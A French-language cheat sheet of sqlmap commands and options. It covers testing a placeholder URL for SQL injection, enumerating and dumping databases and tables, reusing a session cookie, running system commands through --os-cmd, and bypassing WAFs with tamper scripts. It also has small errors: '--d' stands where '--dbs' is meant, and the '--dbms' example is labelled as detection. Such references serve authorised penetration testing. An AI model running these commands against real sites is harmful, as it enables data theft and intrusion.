# SQLMap Cheat Sheet 

##  Commandes les plus utiles

### Test simple d'injection sur une URL
```
sqlmap -u "http://site.com/page.php?id=1"
```
`
###  Détection + dump automatique de la BDD
```
sqlmap -u "http://site.com/page.php?id=1" --batch --dump
```
`
###  Spécifier un paramètre vulnérable
```
sqlmap -u "http://site.com/page.php" --data="id=1" --batch
```
`
###  Enumérer toutes les BDD
```
sqlmap -u "http://site.com/page.php?id=1" --d
```

### Choisir une BDD spécifique et lister ses tables
```
sqlmap -u "http://site.com/page.php?id=1" -D nom_bdd --tables
```
`
###  Lister les colonnes d'une table spécifique
```
sqlmap -u "http://site.com/page.php?id=1" -D nom_bdd -T nom_table --columns
```

###  Dumper les données d'une table spécifique
```
sqlmap -u "http://site.com/page.php?id=1" -D nom_bdd -T nom_table --dump
```
`
###  Scan avec cookie de session
```
sqlmap -u "http://site.com/page.php?id=1" --cookie="PHPSESSID=abc123"
```
`
###  Utilisation d’un fichier POST complet
```
sqlmap -r requete.txt
```

### Détection du SGBD
```
sqlmap -u "http://site.com/page.php?id=1" --dbms=mysql
```
`
### Tentative d'exécution de commande système (si vulnérable)
```
sqlmap -u "http://site.com/page.php?id=1" --os-cmd="whoami"`
```

###  Bypass WAF avec random case + encodage
```
sqlmap -u "http://site.com/page.php?id=1" --tamper=between,randomcase,charencode
```

---

## 🧩 Options utiles (tableau)

|Option|Description courte|
|---|---|
|`-u`|URL cible|
|`--data`|Paramètres POST à injecter|
|`-r`|Requête brute (fichier texte avec headers)|
|`--dbs`|Enumérer les bases de données|
|`-D`|Sélectionner une base de données|
|`--tables`|Lister les tables|
|`-T`|Sélectionner une table|
|`--columns`|Lister les colonnes|
|`--dump`|Extraire les données|
|`--batch`|Mode non interactif (valide tout par défaut)|
|`--level=1-5`|Profondeur du scan (1 par défaut, 5 = complet)|
|`--risk=1-3`|Risque des requêtes (1 = safe, 3 = agressif)|
|`--os-cmd`|Exécuter commande système (si injectable)|
|`--cookie`|Inclure cookie pour session|
|`--tamper=<scripts>`|Bypass WAF/IDS (ex: `between`, `charencode`, etc.)|
|`--technique=BEUSTQ`|Forcer type d’injection (Boolean, Error, Union...)|
|`--dbms=<type>`|Forcer un type de SGBD (MySQL, MSSQL, etc.)|
